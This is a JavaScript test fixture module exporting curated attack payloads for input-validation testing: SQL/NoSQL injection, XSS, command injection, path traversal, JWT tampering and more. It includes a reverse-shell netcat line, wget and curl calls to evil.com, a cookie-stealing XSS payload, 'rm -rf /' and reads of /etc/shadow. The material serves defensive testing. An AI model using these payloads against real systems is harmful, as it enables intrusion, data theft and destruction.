/**
 * Attack Payloads - Curated security test payloads
 * Used to test input validation and injection prevention
 */

module.exports = {
    // NoSQL Injection Payloads
    noSqlInjection: [
        { "$gt": "" },
        { "$ne": null },
        { "$gt": undefined },
        { "$regex": ".*" },
        { "$where": "1==1" },
        { "$or": [{ "a": 1 }, { "b": 2 }] },
        { "$and": [{ "a": 1 }] },
        { "$nin": [] },
        { "$exists": true },
        "'; return db.users.find(); var x='"
    ],

    // SQL Injection Payloads
    sqlInjection: [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1'; EXEC xp_cmdshell('dir'); --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "1 OR 1=1",
        "' OR ''='",
        "'; INSERT INTO users VALUES ('hacker'); --",
        "1; UPDATE users SET password='hacked'--",
        "') OR ('1'='1"
    ],

    // XSS Payloads
    xss: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<div onmouseover='alert(1)'>hover me</div>",
        "'\"><script>alert('XSS')</script>",
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",
        "<svg/onload=alert('XSS')>",
        "<body background=\"javascript:alert('XSS')\">",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=\"alert('XSS')\">",
        "<math><maction actiontype='statusline#http://evil.com'>click</maction></math>",
        "<a href=\"data:text/html,<script>alert('XSS')</script>\">click</a>",
        "{{constructor.constructor('return this')().alert('XSS')}}",
        "${alert('XSS')}",
        "'-alert('XSS')-'"
    ],

    // Unicode/Encoding Attacks
    unicodeAttacks: [
        "\u0000",                              // Null byte
        "\u202e",                              // Right-to-left override
        "%00",                                 // URL-encoded null
        "%3Cscript%3Ealert('XSS')%3C/script%3E", // URL-encoded XSS
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e", // Hex-encoded
        "\uFF1Cscript\uFF1E",                  // Fullwidth characters
        "&#60;script&#62;alert('XSS')&#60;/script&#62;", // HTML entities
        "\\u003cscript\\u003e",                // Unicode escape
        "Ã Â¬Ã Â´Ã Â­",                        // Malformed UTF-8
        "test\r\nX-Injected: header"           // HTTP header injection
    ],

    // Command Injection Payloads
    commandInjection: [
        "; rm -rf /",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "&& cat /etc/shadow",
        "|| ls -la",
        "; nc -e /bin/sh attacker.com 1234",
        "| wget http://evil.com/shell.sh",
        "$(curl http://evil.com/)",
        "; echo 'hacked' > /tmp/pwned"
    ],

    // Path Traversal Payloads
    pathTraversal: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg",
        "....//....//....//etc/shadow",
        "..;/..;/..;/etc/passwd",
        "file:///etc/passwd",
        "\\\\127.0.0.1\\c$\\windows\\system32\\config\\sam"
    ],

    // Email Validation Bypass
    emailBypass: [
        "test@test",
        "@missing.prefix",
        "spaces in@email.com",
        "missing.domain@",
        "double@@at.com",
        "test@[127.0.0.1]",
        "\"test\"@example.com",
        "test@example..com",
        ".startswithdot@example.com",
        "test@exam ple.com"
    ],

    // Oversized Payloads
    oversizedPayloads: {
        longString: 'A'.repeat(1000000),      // 1MB string
        deepObject: (() => {
            let obj = { a: 'value' };
            for (let i = 0; i < 100; i++) {
                obj = { nested: obj };
            }
            return obj;
        })(),
        largeArray: Array(10000).fill('item')
    },

    // Common Weak Passwords
    commonPasswords: [
        "123456",
        "password",
        "12345678",
        "qwerty",
        "123456789",
        "12345",
        "1234",
        "111111",
        "1234567",
        "dragon",
        "123123",
        "baseball",
        "iloveyou",
        "trustno1",
        "sunshine",
        "princess",
        "welcome",
        "admin",
        "letmein",
        "monkey"
    ],

    // JWT Attack Payloads
    jwtAttacks: {
        // Algorithm confusion - 'none' algorithm
        noneAlgorithm: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhhY2tlciIsImFkbWluIjp0cnVlfQ.',
        // Invalid signature
        tamperedToken: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhhY2tlciIsImFkbWluIjp0cnVlfQ.INVALID_SIGNATURE',
        // Expired token (exp: 0)
        expiredToken: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjowfQ.Wf_IpkDxMNvPvWQUeJHQua3qdP4KmGZpCA4Dr4PLmCA',
        // Wrong issuer
        wrongIssuer: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaXNzIjoiZXZpbC1pc3N1ZXIifQ.signature'
    },

    // CSRF Tokens for testing
    csrfPayloads: [
        '',                          // Empty token
        'invalid-token',             // Invalid format
        '<script>steal()</script>',  // XSS in CSRF
        '../../etc/passwd'           // Path traversal in token
    ]
};
